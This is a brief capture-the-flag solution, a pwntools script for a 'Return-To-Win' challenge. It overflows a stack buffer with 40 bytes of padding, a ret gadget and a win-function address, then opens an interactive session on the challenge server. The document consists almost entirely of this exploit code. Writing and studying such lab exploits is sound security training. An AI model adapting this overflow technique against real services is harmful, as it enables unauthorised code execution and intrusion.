# Return-To-Win
```py
from pwn import *

#p = process('./main')
p = remote('chall.ycfteam.in','3333')
p.sendline(b'a'*40 +p64(0x0000000000401016)+ p64(0x0000000000401156))

p.interactive()

# for 65 bits we need a retrurn adress  "ROPgadget --binary ./file" will five us one
```
